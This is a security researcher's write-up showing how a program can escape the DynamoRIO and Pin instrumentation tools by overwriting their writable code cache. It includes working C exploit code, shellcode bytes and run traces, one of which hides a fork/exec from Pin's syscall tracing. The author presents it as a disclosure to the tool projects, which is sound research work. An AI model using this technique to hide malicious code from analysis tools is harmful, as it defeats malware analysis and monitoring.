Escaping DynamoRIO and Pin - or why it's a worse-than-you-think idea to run untrusted code or to input untrusted data
==========================

Before we begin, I want to clarify that both [DynamoRIO](http://www.dynamorio.org/) and [Pin](https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool) are great tools that I use all the time. Dynamic Binary Modification is a very powerful technique in general. However, both implementations have a limitation which can have serious security implications for some uses cases and which, as far as I can tell, is not documented in the user manuals. I got in touch with people involved in both projects and they've explained that they consider it low risk for the typical usage scenario and that fixing it would add performance overhead. This is a perfectly reasonable position, but I think this sort of low risk / high impact issue should be very well and visibly documented.


Background
----------

It all started after I've watched [this Black Hat talk](https://www.youtube.com/watch?v=9oKZx6Cr3X8) on detecting execution under a DBM tool. That's interesting enough, but at the moment it's more or less a trivial problem. Now, **escaping** from the control of a DBI tool should be more challening, right? Well, not so much.


How DBM works
-------------

DynamoRIO docs provide a [nice, concise explanation](http://dynamorio.org/docs/overview.html). The gist of it is that the DBM tool scans and patches all application code before it executes. It does this by (bit of a simplification) decoding the instruction stream and transforming any position-dependent code into position-independent code. This patched code is stored in a separate memory location (called the code cache) from the original application code. In the end, all code will run from the code cache, but for transparency, things like return addresses and access to the Instruction Pointer (IP) register will be translated to make it appear the application is running from its original location. The basic units are the basic blocks (BBs), instruction sequences which have stricly one entry point and one exit point (any jump, branch, call instruction).


The issue
---------

The first thing I've checked when looking for an escape strategy was the permissions of the code cache mapping. To my surprise (but for the practical reasons I've described in the first paragraph), both DynamoRIO and Pin map the code cache with read, write and execute permissions. This has at least two security-related implications:

* it weakens some anti-exploit techniques of modern systems
* it allows any applications to easily escape from the control of the DBM tool

Modern systems avoid mapping executable pages as writeable to make it more difficult to write exploits for vulnerable applications where the attacker can write to memory locations outside the intended buffers. Those systems can still be exploited with [return oriented programming](http://en.wikipedia.org/wiki/Return-oriented_programming), however if executable memory is writeable when running under a DBM system, it might be possible either to directly overwrite the code cache or to reduce the complexity of required ROP code. I haven't yet investigated this scenario. The rest of this article is about the second issue.


The escape
----------

This is an implementation for x86-64.

At this point we know that there will be some R/W/E mappings in the address space, but not much else. In order to write an exploit, he have to solve several problems:

* How to find the address of the code cache? ASLR is used
* How to determine which location in the code cache to use? Writing at the wrong place could either crash the process or never be triggered.
* How to actually trigger the newly written code? If we simply have the application jump to it, the DBM system will just scan it and maintain control.

The first problem is easy enough to solve on Linux, the kernel exposes all mappings of the calling process in `/proc/self/maps`. If this feature isn't available, I suspect it's possible to find some references in stale stack data or to probe the address space, but I haven't checked.

```C
char *buf;
  
FILE *maps = fopen("/proc/self/maps", "r");
fread(maps_s, 1, MAX_MAPS_LEN, maps);
buf = maps_s;
```

The last two problems are related. My solution was to first execute some code containing a known and fairly unique pattern that doesn't get translated, for example a 32 bit immediate `MOV` with a known an valid address. Since I'm a bit lazy, I've decided to code the exploit in C and depend on the compiler to generate the instructions I need, so be warned that a different compiler or different settings might not produce usable results:

```C
char msg[] = "It's a trap!\n";

void trap() {
  printf(msg);
}
```

The msg array needs to be global, so that the compiler places it in the .data segment and setting the parameter for `printf()` in `trap()` gets encoded as a `MOV` instruction with the full address as an immediate value parameter:

```
bf 88 0d 60 00   mov    $0x600d88,%edi
b8 00 00 00 00   mov    $0x0,%eax
e8 6f fe ff ff   call   400570 <printf@plt>
```

After we have called `trap()` once, we can search all mappings for occurences of msg's address (which is encoded in the first `MOV` instruction above). If we avoid the pages beloging to the application's image and the stack, any matches are going to be copies of this `MOV` instruction in the code cache, except any unlucky coincidences.

```C
char *start;
char *end;
char *p;
char read_p;

while(sscanf(buf, "%llx-%llx %c\n", &start, &end, &read_p) == 3) {
  /* msg is in the .data segment, which should be linked at a low
     address; start will be on the stack, which is expected to be
     at a high adress. The code cache should be somewhere in between.
  */
  if (read_p == 'r' && start > msg && end < (char *)&start) {
      
    p = start;
    while (p < (uint8_t*)end-6) {
      if (   p[0] == (uint8_t)((msg_p >> 0) & 0xFF)
          && p[1] == (uint8_t)((msg_p >> 8) & 0xFF)
          && p[2] == (uint8_t)((msg_p >> 16) & 0xFF)
          && p[3] == (uint8_t)((msg_p >> 24) & 0xFF))
      {
        printf("Found at %p\n", p);

      }
      p++;
    }
  }
    
  buf = memchr(buf, '\n', maps_s + MAX_MAPS_LEN - buf);
  buf++;
}
```

Once the location(s) of the `MOV` instruction in the code cache is/are found, we are free to overwrite it with our shellcode which escapes from the DBM tool's control by jumping directly to a function in the .text segment:

```C
p--; // to start overwriting at the opcode part of the MOV instruction
p[0] = 0x68; // push &escape
p[1] = (uint64_t)&escape & 0xFF;
p[2] = ((uint64_t)&escape >> 8) & 0xFF;
p[3] = ((uint64_t)&escape >> 16) & 0xFF;
p[4] = ((uint64_t)&escape >> 24) & 0xFF;
p[5] = 0xC3; // reti
```

`escape()` is our function which will execute directly, without being scanned or patched by the DBM tool:

```C
void escape() {
  printf("Escaped!\n");
  exit(0);
}
```

A more complete implementation would remove the signal handlers set up by the DBM system at this point, but this will do for us.

Finally, we can trigger the newly encoded instruction by calling `trap()` again.

The complete file is available in the same directory as this document with the name `escape.c`. If we execute the compiled executable directly, we get this output:

```
$ ./escape 
It's a trap!
It's a trap!
```

However, when executed under DynamoRIO:

```
$ drrun -- ./escape
It's a trap!
Found at 0x50c2571d
Escaped!
```

And under Pin:

```
$ pin -- ./escape
It's a trap!
Found at 0x7f851c6cbe7d
Escaped!
```

Finally we should verify that the code in `escape()` executes directly and that it doesn't in fact execute from the code cache. One straightforward way of doing this is by using a system call tracing utility implemented as a Pin or DynamoRIO tool:

```
$ pin -t ./source/tools/ManualExamples/obj-intel64/strace.so -- ./escape
  It's a trap!
  Found at 0x7fe74fbf9e2d
  Escaped!

$ cat ./strace.out
[...]
0x7fe74f6a7f12: 5(0x1, 0x7ffffa0b95e0, 0x7ffffa0b95e0, 0x254, 0x400, 0x7fe74f594700)returns: 0x0
0x7fe74f6b1258: 9(0x0, 0x1000, 0x3, 0x22, 0xffffffff, 0x0)returns: 0x7fe74f47f000
0x7fe74f6a859e: 1(0x1, 0x7fe74f47f000, 0xd, 0x22, 0xffffffff, 0x0)returns: 0xd
0x7fe74f6a859e: 1(0x1, 0x7fe74f47f000, 0x18, 0x0, 0x7fe74f72b140, 0x7fe74fbf9e2d)returns: 0x18
```

The last two systemcalls are `write` (1), one with length 13 (`It's a trap!\n`) and the other one with length 24 (`Found at 0x7fe74fbf9e2d\n`). Pin didn't detect the two systemcalls from `escape()`: `write(stdout, "Escaped\n")` and `sys_exit`, so we have definitely escaped.


There's more
------------

At this point you might be thinking that while this could be a serious issue, it's really obvious if an application has escaped. That's incorrect. The following section describes a way to escape from the DBM tool's control, execute some completely uninstrumented code directly, and then gracefully return to the code cache and under the control of the DBM system which will continue to execute normally.

We'll start by modifying our `escape()` function:

```C
void escape() {
  printf("Escaped!\n");
  if (fork() == 0) {
    execlp("uname", "", "-s", "-m", NULL);
    exit(EXIT_FAILURE);
  }
}
```

It will now fork and execute `uname -s -m` in the child process. This isn't something required for this technique to work, it's just an example of operations that could be hidden from the DBM system. We also modify the main function to execute `printf("Back to CC\n");` after the second call to `trap()`, so we know if control is gracefully returned to the DBM system / code cache.

Now we are no longer able to overwrite the `printf(msg)` function call since we want it to execute as expected. Operations on volatile variables are an easy way to convince the compiler to fill some space with dummy code:

```C
void trap() {
  volatile int a;
  a += 0x1;
  a += 0x1;
  printf(msg);
}
```

This compiles to:

```
55                push   %rbp
48 89 e5          mov    %rsp,%rbp
48 83 ec 10       sub    $0x10,%rsp
8b 45 fc          mov    -0x4(%rbp),%eax
83 c0 01          add    $0x1,%eax
89 45 fc          mov    %eax,-0x4(%rbp)
8b 45 fc          mov    -0x4(%rbp),%eax
83 c0 01          add    $0x1,%eax
89 45 fc          mov    %eax,-0x4(%rbp)
bf 20 0f 60 00    mov    $0x600f20,%edi
b8 00 00 00 00    mov    $0x0,%eax
e8 0a fe ff ff    callq  4005e0 <printf@plt>
c9                leaveq 
c3                retq
```

We'll overwrite the space between (not including) the `SUB` instruction and `mov $0x600f20,%edi` with our shellcode:

```
   push %rdi // this happens to be used both by Pin in the BB and our escape function
   jmp b
a: push &escape
   ret
b: call a
   pop %rdi
   [...]    // remaining space filled with nops
```

This might look a bit weird, but essentially it just saves the address of `pop %rdi` as a return address and then it calls `escape()`.

The complete file is available under the name `sneaky.c`.

Once again, let's run the application directly:

```
$ ./sneaky 
It's a trap!
It's a trap!
Back to CC
```

And under DynamoRIO:

```
$ drrun -- ./sneaky
It's a trap!
Found at 0x53bfd733
Escaped!
It's a trap!
Back to CC
Linux x86_64 // notice the output of uname
```

And under Pin:

```
$ pin -- ./sneaky
It's a trap!
Found at 0x7f9c8489ee43
Escaped!
It's a trap!
Linux x86_64 // output of uname here as well
Back to CC
```

And if we look at the system call trace from Pin:
```
[...]
0x7f9c8434d59e: 1(0x1, 0x7f9c84124000, 0xd, 0x22, 0xffffffff, 0x0)returns: 0xd
0x7f9c8434d59e: 1(0x1, 0x7f9c84124000, 0x18, 0x0, 0x7f9c843d0140, 0x7f9c8489ee43)returns: 0x18
0x7f9c8434d59e: 1(0x1, 0x7f9c84124000, 0xd, 0x7f9c9779aa10, 0x0, 0x7f9c84239700)returns: 0xd
0x7f9c8434d59e: 1(0x1, 0x7f9c84124000, 0xb, 0x7f9c9779aa10, 0x7f9c84239700, 0x7f9c84239700)returns: 0xb
0x7f9c84329b67: 231(0x0, 0x0, 0x8, 0xffffffffffffff90, 0x3c, 0xe7)#eof
```

Notice the write calls for `It's a trap`, `Found at 0x7f9c8489ee43`, the second `It's a trap`, `Back to CC` and finally the `sys_exit` call. Note how there's no trace of `write`-ing `Escaped!`, `fork`-ing or `execve`, while the systemcalls executing after that, back under Pin's control, are included and everything else looks normal. Now, let's say you were instrumenting malware for analysis: it would have just sneaked a bunch of stuff including an `exec()` past you.

I really hope the manuals of DynamoRIO and Pin get updated with a warning about this.


License
-------

This document is licensed under a [Creative Commons Attribution-ShareAlike 4.0 International License](http://creativecommons.org/licenses/by-sa/4.0/). The full code is separately licensed under the [BSD 2-Clause License](http://opensource.org/licenses/BSD-2-Clause).

